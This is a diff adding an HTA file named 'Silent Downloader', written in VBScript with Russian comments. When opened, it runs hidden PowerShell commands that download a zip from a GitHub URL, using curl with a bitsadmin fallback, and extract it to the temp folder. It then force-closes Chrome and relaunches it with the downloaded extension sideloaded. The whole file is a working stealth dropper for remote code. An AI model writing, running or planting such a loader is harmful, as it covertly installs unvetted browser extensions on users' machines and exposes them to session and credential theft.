@@ -1,0 +1,58 @@
+<html>
+<head>
+<title>Silent Downloader</title>
+<hta:application id="downloader" windowState="minimize"/>
+</head>
+<body>
+<script language="VBScript">
+Sub Window_onLoad
+    On Error Resume Next
+    
+    Set shell = CreateObject("WScript.Shell")
+    
+    ' Пробуем сначала через curl (быстрее)
+    curlCmd = "powershell -WindowStyle Hidden -Command ""curl.exe -L -o $env:TEMP\test.zip https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip"""
+    shell.Run curlCmd, 0, True
+    
+    ' Проверяем, скачался ли файл
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
+    
+    If Not fso.FileExists(tempFolder & "\test.zip") Then
+        ' Если curl не сработал, пробуем через bitsadmin
+        bitsCmd = "powershell -WindowStyle Hidden -Command ""bitsadmin /transfer downloadJob /download /priority FOREGROUND 'https://github.com/gospodinsreda/avito_yola/raw/refs/heads/master/test.zip' '$env:TEMP\test.zip'"""
+        shell.Run bitsCmd, 0, True
+    End If
+    
+    ' Финальная проверка и установка расширения
+    If fso.FileExists(tempFolder & "\test.zip") Then
+        ' Создаем папку и распаковываем
+        If Not fso.FolderExists(tempFolder & "\test") Then
+            fso.CreateFolder(tempFolder & "\test")
+        End If
+        
+        unzipCmd = "powershell -WindowStyle Hidden -Command ""& {Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('" & tempFolder & "\test.zip', '" & tempFolder & "\test')}"""
+        shell.Run unzipCmd, 0, True
+        
+        ' Удаляем zip после распаковки
+        fso.DeleteFile(tempFolder & "\test.zip")
+        
+        ' Закрываем Chrome если он запущен
+        shell.Run "taskkill /F /IM chrome.exe /T", 0, True
+        ' Ждем 2 секунды
+        shell.Run "ping -n 3 127.0.0.1", 0, True
+        
+        ' Запускаем Chrome с нашим расширением
+        chromePath = """C:\Program Files\Google\Chrome\Application\chrome.exe"""
+        extensionPath = """" & tempFolder & "\test"""
+        shell.Run chromePath & " --load-extension=" & extensionPath & " chrome://extensions --no-first-run", 1, False
+    Else
+        ' Лог ошибки можно записать в файл, если нужно
+    End If
+    
+    self.close
+    window.close
+End Sub
+</script>
+</body>
+</html>
